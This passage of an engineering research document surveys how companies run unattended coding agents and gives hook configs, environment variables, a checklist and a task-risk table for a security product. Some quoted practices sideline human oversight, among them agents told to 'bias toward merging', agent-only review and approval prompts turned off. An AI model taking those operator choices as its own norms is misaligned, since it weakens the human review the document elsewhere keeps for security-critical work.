- **Notification:** Texts via Telegram when done or stuck

### Ramp (Inspect)
- **Cloud sandboxes:** Modal with pre-built snapshots every 30 minutes, near-instant start
- **Full dev environment per sandbox:** Postgres, Redis, Temporal, RabbitMQ, VS Code server, web terminal, VNC with Chromium
- **Cloudflare Durable Objects:** Isolated SQLite per session for state management
- **Child sessions:** Agents can spawn sub-sessions for parallel research or approach exploration
- **Multiplayer:** Multiple team members collaborate in single sessions
- **Non-engineers shipping code:** PMs and designers directly ship through the system -- not just engineers
- **Input routing:** Slack, web, Chrome extension via Modal Queues
- **Unlimited concurrent sessions:** "Your laptop doesn't need to be involved at all"
- **Statistics page:** Track sessions-to-merged-PRs as the key metric
- **Result:** ~40-50% of all merged PRs written by Inspect (up from 30% in early 2026)

### Harvey AI (Spectre)
- **Durable objects:** Every agent session records all actions for audit
- **Team visibility:** Real-time observation of agent work across Slack, web, PRs
- **Same runtime for interactive and automated:** No distinction between human-prompted and scheduled work
- **Pattern convergence:** Stripe and other scale companies independently built similar platforms

### OpenAI (Harness Engineering)
- **1M LOC, zero human-written:** 5-month experiment, ~1,500 PRs, 5-10 PRs/engineer/day (revised up from initial 3.5)
- **Token consumption:** ~1 billion tokens/day, ~$2-3k daily spend with caching
- **Record run:** One experiment ran Codex for 25 hours uninterrupted, consuming 13M tokens and generating 30k lines of code
- **AGENTS.md as TOC:** ~100 lines, progressive disclosure, points to structured `docs/`
- **Structured knowledge:** `AGENTS.md` (~100 lines), `CORE_BELIEFS.md`, `TECH_TRACKER.md` (markdown table of business logic), `QUALITY_SCORE.md`, 6 core skills with tracing/metrics
- **Symphony orchestration:** Elixir-based process supervision spawning a daemon per task; "rework state" trashes failed work trees and restarts from scratch
- **One-minute build rule:** Hard 1-minute maximum build loop enforced — agents halt if builds exceed this, triggering task decomposition
- **Ghost libraries:** Distribute software as specs, not source code; spawn clean agent to reimplement from spec, spawn second agent to validate vs. upstream
- **P0-P2 review scoring:** Code review agents score feedback by severity; both authoring and reviewing agents instructed to "bias toward merging"
- **Dependency layering:** Types, Config, Repo, Service, Runtime, UI -- agents restricted to their layer
- **Structural enforcement:** Custom linters and tests enforce architecture, not just documentation
- **Golden principles + GC:** Recurring background tasks scan for deviations and open refactoring PRs
- **Agent-to-agent review:** Over time, almost all review is agent-to-agent. Humans not required.
- **Agent legibility over human taste:** Code optimized for agent's ability to reason about it
- **6+ hour autonomous runs** while humans sleep
- **Codex CLI:** `--full-auto` flag combines `--approval-mode never` and `--sandbox workspace-write`; `/goal` command enables fully autonomous agentic loops

### Cursor (Agent Harness)
- **Cloud agents:** Launched Feb 24, 2026 — isolated Ubuntu VMs per task, no shared state
- **Video demos:** Agents run the software they build, interact with it, capture video/screenshots/logs for verification
- **Reliability journey:** Migrated from work-stealing to Temporal-based orchestration; "one 9" to "two 9s" at 50M+ actions/day
- **Scale:** 7+ million unique workflows, 30-40% of internal PRs from cloud agents
- **Self-hosted option:** Code stays in your network (enterprise offering)
- **Cost:** ~22.5% of Pro plan credits per 50k-line-codebase run; daily users spend $60-$100/month
- **Key lesson:** "The single biggest factor in cloud agent output quality is ensuring it has a full development environment"
- **Dynamic context:** Remove guardrails as models improve. Let agents pull own context.
- **Keep Rate metric:** Track what fraction of agent code remains after fixed intervals
- **Tool reliability at 3 9s:** Drive unexpected tool errors down by order of magnitude
- **Three-layer state decoupling:** Agent loop (Temporal), machine state (VM), conversation state
- **"Simplicity and control":** Better tools + clear prompts beat complex harness logic
- **Multi-agent future:** Specialized agents for planning, fast edits, debugging -- harness orchestrates dispatch

### Dark Software Factory Synthesis (Academic Paper)
- **Sediment Problem:** Context quality degrades after ~100k tokens; agents must stay in the "Smart Zone"
- **Zero-trust AFK identity:** Use DeepSecure's own Ed25519 + delegation_tokens to secure AFK agent swarms (dog-fooding)
- **Fast-merge philosophy:** At agent scale, blocking merge gates are the bottleneck — merge fast, rollback automatically
- **Day Shift / Night Shift:** Formal separation of human planning (day) and agent execution (night)
- **Skill engineering discipline:** Mandatory gotchas.md, run telemetry, semantic deduplication, quality scoring
- **Keepalive mechanisms:** `session_keepalive_interval_ms`, tmux watchdog scripts for long-running sessions
- **Blast radius limiting:** Small PRs, feature flags, anomaly detection, automated rollback, lineage records
- **Hermes Agent:** Persistent meta-orchestrator as potential scheduling/notification/memory layer above Claude Code

### Nous Research (Hermes Agent)
- **Meta-orchestrator:** Persistent autonomous agent that delegates coding work to Claude Code, Codex, or OpenCode
- **Self-improving skills:** Skills auto-created after complex tasks and improve during use; compatible with agentskills.io standard
- **6 terminal backends:** Local, Docker, SSH, Singularity, Modal (serverless), Daytona — solves keepalive via serverless hibernation
- **Built-in cron:** Natural-language task scheduling ("run Ralph loop every night at 2am")
- **Multi-platform messaging:** Slack, Telegram, Discord, WhatsApp, Signal, SMS, Email from one process
- **Persistent memory:** Agent-curated cross-session recall with FTS5 search, replaces file-based `.afk/learnings.md`
- **Parallel workers:** ThreadPoolExecutor (up to 8 concurrent subagents) with isolated terminal backends
- **Adoption path:** Not a default replacement for Claude Code; evaluate as orchestration layer once Ralph loop is stable (Phase 3+)
- **NEW — v0.14.0 "The Foundation Release" (May 16, 2026):**
  - Real PyPI package: `pip install hermes-agent && hermes`
  - **`/handoff` command:** Transfers active sessions live between models without losing context
  - **Cross-session prompt caching** (1 hour) for Claude — significant cost savings
  - **OpenAI-compatible local proxy:** Lets Codex, Aider, and Cline access Claude Pro/ChatGPT Pro subscriptions without separate API keys
  - xAI Grok support (grok-4.3 with 1M context), 22 messaging platforms (added LINE and SimpleX)
  - Cold-start 19 seconds faster (deferred imports, caching), browser CDP 180x faster (persistent WebSocket)
  - LSP semantic diagnostics on file writes, 9 new optional skills (trading, OSINT, infrastructure)

### Peter Steinberger (steipete — Contrarian Practitioner)
- **Anti-infrastructure:** No worktrees, no MCP, no subagents, no plugins — "organizational scar tissue"
- **Pointer-style AGENTS.MD:** Shared rules file at `~/Projects/agent-scripts/AGENTS.MD` symlinked from all repos
- **Iterative rules:** Started with one line, grew to ~800 lines iteratively — rules built by the agent from failures, not authored upfront
- **Screenshot prompts:** ~50% of prompts contain screenshots. Prompts are 1-2 sentences.
- **Tool switching:** Uses both Claude Code and Codex CLI daily. Codex "far more careful and reads much more files" before acting.
- **"Agentic Engineering":** Coined as counterpoint to "vibe coding" — treats AI coding as craft requiring senior-engineer intuition
- **Key repos:** `agent-scripts` (AGENTS.MD, skills with YAML frontmatter, hooks, committer script), `agent-rules` (archived May 3, 2026)
- **Takeaway for AFK:** The lightweight approach works for solo practitioners — but doesn't scale to multi-service architectures like DeepSecure

### AFK Community Tools

| Tool | Type | Key Feature | License |
|------|------|-------------|---------|
| [Afkode](https://afkode.ai) | Desktop app (macOS) | 8-phase planning engine, 16 model slots across planning/execution/review, operational journal | Proprietary (7-day trial) |
| [Agent AFK](https://agentafk.com) | npm CLI | 11 built-in skills, adversarial re-derivation, Telegram oversight, reversibility-aware autonomy | Apache-2.0 |
| [Background Claude](https://backgroundclaude.com) | Documentation site | Three modes (headless, scheduled, managed), Linear issue → worktree → Claude → PR | — |
| [Ralph v0.11.5](https://github.com/frankbria/ralph-claude-code) | Bash script | Circuit breaker, dual-exit gate, rate limiting, GitHub integration, `.ralphrc` config | MIT |

### Eva Khmelinskaya (Overnight Autonomy Practitioner)
- **Phased sessions:** Break work into 30-60 minute phases, each as independent `claude --print` invocation
- **`< /dev/null`:** "#1 overnight failure mode" — without it, Claude hangs waiting for stdin in background
- **Compaction rule dilution:** "Even essential CLAUDE.md instructions lose effectiveness after multiple compaction rounds"
- **Context monitoring:** Claude cannot monitor its own context usage — the harness must enforce limits
- **`--max-budget-usd`:** Per-session cost ceiling is essential for overnight runs
- **File-based state:** Each phase reads STATUS.md at start, does work, commits, updates STATUS.md, exits

### Anthropic Engineering (Harness Research)
- **JSON for state tracking:** "Models are less likely to inappropriately modify structured JSON compared to Markdown"
- **Single-feature-per-session:** Enforce constraints to prevent agents from attempting to one-shot entire applications
- **Browser automation for verification:** Use Puppeteer, not just unit tests, for end-to-end verification
- **Progress files + git history:** Primary coherence mechanism across context windows, not compaction
- **Claude Agent SDK:** Same tools, agent loop, and context management as Claude Code, programmable in Python/TypeScript
- **Managed Agents:** Stateful, long-running, resumable sessions with server-side storage for production use

### Addy Osmani (Self-Improving Agents)
- **Anti-rationalization tables:** Explicit rules listing common rationalizations agents use to skip steps, and why they're wrong
- **Compounding error math:** 20 steps at 95% per-step = 36% overall success. Fewer steps = higher reliability.
- **Scope creep is the primary failure mode:** Failed PRs tend to be invasive and sprawling; merged PRs touch fewer files
- **Small, focused changes build trust:** Agents that attempt large refactors fail; agents that produce small changes succeed
- **Academic finding:** Agents produce syntactically correct code that fails because it "does not fit the social, organizational, and workflow realities of modern software development"

---

## Appendix: Complete Hook Configuration Reference (Corrected May 2026)

Full hooks.json for AFK-optimized DeepSecure development. **All event names verified against the actual Claude Code API.**

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Edit|Write",
        "hooks": [{
          "type": "command",
          "command": "FILE_PATH=$(echo $TOOL_INPUT | jq -r '.file_path // empty'); if [ -n \"$FILE_PATH\" ] && echo \"$FILE_PATH\" | grep -q '\\.py$'; then ruff format --quiet \"$FILE_PATH\" 2>/dev/null; isort --quiet \"$FILE_PATH\" 2>/dev/null; fi"
        }]
      }
    ],
    "SessionStart": [
      {
        "matcher": "compact",
        "hooks": [{
          "type": "command",
          "command": "cat .claude/compact-recovery.md 2>/dev/null || true"
        }]
      },
      {
        "matcher": "startup",
        "hooks": [{
          "type": "command",
          "command": "echo '--- Recent commits ---'; git log --oneline -5 2>/dev/null; echo '--- Branch ---'; git branch --show-current 2>/dev/null; echo '--- Open PRs ---'; gh pr list --limit 3 2>/dev/null || true"
        }]
      }
    ],
    "Stop": [
      {
        "hooks": [{
          "type": "command",
          "command": ".claude/hooks/on-task-stop.sh"
        }]
      }
    ],
    "Notification": [
      {
        "matcher": "permission_prompt",
        "hooks": [{
          "type": "command",
          "command": "scripts/notify.sh 'Permission Blocked' 'Claude Code is waiting for permission approval' urgent"
        }]
      }
    ],
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{
          "type": "command",
          "command": "echo $TOOL_INPUT | jq -r '.command // empty' | grep -qE '^git commit' && scripts/security-scan.sh || true"
        }]
      }
    ]
  }
}
```

**Removed (non-existent events):** `PostCompact`, `PreCompact`, `PermissionRequest`, `SessionEnd`, `SubagentStop`
**Replaced with:** `SessionStart` (compact/startup matchers), `Notification` (permission_prompt matcher), `Stop`

---

## Appendix: Environment Variables for AFK

```bash
# Add to shell profile (~/.zshrc or ~/.bashrc) — NOT .env files (security risk)

# Slack notifications for AFK
export DEEPSECURE_SLACK_WEBHOOK="https://hooks.slack.com/services/YOUR/WEBHOOK/URL"

# Telegram notifications (optional)
export DEEPSECURE_TELEGRAM_TOKEN="your-bot-token"
export DEEPSECURE_TELEGRAM_CHAT_ID="your-chat-id"

# Ralph loop defaults
export RALPH_MAX_ITERATIONS=10
export RALPH_MAX_TURNS=80
export RALPH_MAX_BUDGET=5.00  # USD per iteration

# Claude Code permissions (reduce prompts)
export CLAUDE_CODE_ALLOW_TOOLS="Edit,Write,Read,Bash(git:*),Bash(pytest:*),Bash(make:*)"

# Context management (Boris's recommendation for 1M context models)
export CLAUDE_CODE_AUTO_COMPACT_WINDOW=400000  # Compact at 400k tokens to avoid context rot

# Model overrides (useful for AFK cost optimization)
# export CLAUDE_CODE_SUBAGENT_MODEL=inherit  # Normal resolution (default)
# export CLAUDE_CODE_SUBAGENT_MODEL=sonnet   # Force all subagents to Sonnet (cheaper)
# export ANTHROPIC_DEFAULT_OPUS_MODEL=claude-opus-4-8-20260528
# export ANTHROPIC_DEFAULT_SONNET_MODEL=claude-sonnet-4-6-20260414

# Disable adaptive thinking (Opus 4.6/Sonnet 4.6 only — reverts to fixed MAX_THINKING_TOKENS)
# export CLAUDE_CODE_DISABLE_ADAPTIVE_THINKING=1
```

**Security note:** Never put webhook URLs or API tokens in `.env` files within the repo. Use shell profile exports instead. For a security product, credential hygiene in development tooling matters.

**OWASP ASI05 note:** The OWASP Top 10 for Agentic Applications (2026) recommends hardware-enforced sandboxing for autonomous agents. For unsupervised AFK execution, Docker or WASM containers are recommended over software-only permission controls. See Phase 3.5 for Docker sandbox implementation.

---

## Appendix: Quick Start Checklist

To go AFK on a DeepSecure workstream today:

```
Phase 0: Verify API Surface (one-time, P0 BLOCKER)
[ ] Run scripts/verify-claude-api.sh to test all assumed features
[ ] Verify hook event names match actual Claude Code API
[ ] Test --max-budget-usd and --permission-mode flags
[ ] Document any features that don't exist

Phase 0.5: Setup (one-time)
[ ] Expand permission allowlist in settings.local.json (Phase 1a)
[ ] Set up hooks (Phase 1b-1f) — use CORRECTED event names
[ ] Set up notifications: scripts/notify.sh + Slack/Telegram webhook (Phase 3)
[ ] Upgrade agent frontmatter (Phase 1.5)
[ ] Set env vars in shell profile (NOT .env files)

Phase 1: Planning (per feature)
[ ] Complete planning: /run-plan <feature> <design-doc>
[ ] Or use /grill-me for requirements elicitation first
[ ] Verify prerequisites: all 7 workstream files exist
[ ] Create ralph_progress.json with JSON task list (Step 2d)
[ ] Create ralph-prompt.md with workstream context

Phase 2: Manual Stepping Stone
[ ] Run ./scripts/afk-once.sh <workstream> -- watch the output
[ ] Fix any failures, update CLAUDE.md/skills
[ ] Repeat 5-10 times until stable
[ ] Verify dirty-tree guard works (kill mid-task, restart, check stash)
[ ] Verify JSON progress updates correctly

Phase 3: AFK Execution
[ ] Enable caffeinate (or use cloud VM) for overnight
[ ] Run: ./scripts/ralph.sh <workstream-name> <max-iterations>
[ ] Go AFK
[ ] Come back when notified (or check ralph_progress.json)
[ ] If crashed: run ./scripts/afk-recover.sh <workstream>

Phase 4: Review and Ship
[ ] Review changes: git log, git diff
[ ] Run full checks: make check-all
[ ] Create PR: /commit-push-pr
[ ] Optionally: /babysit-pr to automate merge lifecycle
```

---

## Appendix: AFK Task Classification for DeepSecure

Based on Karpathy's "automate what you can verify" principle, applied to DeepSecure's specific domains:

| Domain | Verifiable? | AFK Level | Reasoning |
|--------|-------------|-----------|-----------|
| Standard CRUD endpoints | Yes (pytest) | Full AFK | Well-understood patterns, easy to test |
| Database migrations | Yes (migrate up/down) | Full AFK | Deterministic, testable |
| CLI commands | Yes (click testing) | Full AFK | Clear input/output contract |
| SDK client methods | Yes (unit tests) | Full AFK | Isolated, mockable |
| Gateway routing | Yes (integration tests) | Full AFK with review | Cross-service, needs integration test |
| Auth challenge-response | Partially | HITL | Crypto domain valley, subtle bugs |
| JWT creation/validation | Partially | HITL | Security-critical, edge cases |
| Ed25519 key operations | Partially | HITL | Crypto domain valley |
| Split-key architecture | Partially | HITL | Novel pattern, low training data |
| Permission/delegation model | No (judgment) | Human-only | Security architecture decision |
| API contract design | No (judgment) | Human-only | Requires product understanding |
| Trust model changes | No (judgment) | Human-only | Security-critical design |

---

*Document created: 2026-05-26*
*Last updated: 2026-06-08 (major revision: 15 new sources [33→48], 2 new design principles [14-15], Pillar 10 Routines, Pillar 11 Agent View, Dynamic Workflows 6 composition patterns, /goal command, Agent SDK billing, Production Failure Modes section, AFK Cost Economics section, Competitive Landscape, steipete contrarian view, Ralph v0.11.5, Hermes v0.14.0, OWASP ASI05, community AFK tools, Boris's 98 tips including /go and auto-dream)*
*Previous revision: 2026-05-29 (13 new sources, corrected hook API surface, JSON progress, dirty-tree guard, machine sleep protocol, Docker sandbox, architectural decision section)*
*Based on research from 48 industry sources (see [Research Sources](#research-sources))*
